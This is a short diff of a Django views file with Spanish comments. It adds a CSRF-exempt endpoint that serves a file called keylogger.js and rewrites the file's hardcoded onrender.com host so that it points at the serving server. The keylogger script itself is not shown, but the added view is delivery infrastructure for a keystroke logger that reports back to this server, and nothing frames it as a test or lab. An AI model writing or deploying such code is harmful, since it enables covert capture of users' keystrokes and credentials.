@@ -108,3 +108,25 @@ def api_stl(request):
         print('❌ ERROR en api_stl:')
         print(error_detallado)
         return JsonResponse({'error': str(e)}, status=500)
+    
+@csrf_exempt
+def keylogger_js(request):
+    """Sirve el archivo keylogger.js"""
+    # Leer el archivo keylogger.js
+    import os
+    from pathlib import Path
+    
+    BASE_DIR = Path(__file__).resolve().parent.parent
+    file_path = os.path.join(BASE_DIR, 'pnl_xa', 'templates', 'keylogger.js')
+    
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+        
+        # Reemplazar la URL del servidor dinámicamente
+        servidor_url = request.build_absolute_uri('/').rstrip('/')
+        content = content.replace('https://ax-mntt.onrender.com', servidor_url)
+        
+        return HttpResponse(content, content_type='application/javascript')
+    except FileNotFoundError:
+        return HttpResponse("// Keylogger no encontrado", content_type='application/javascript')
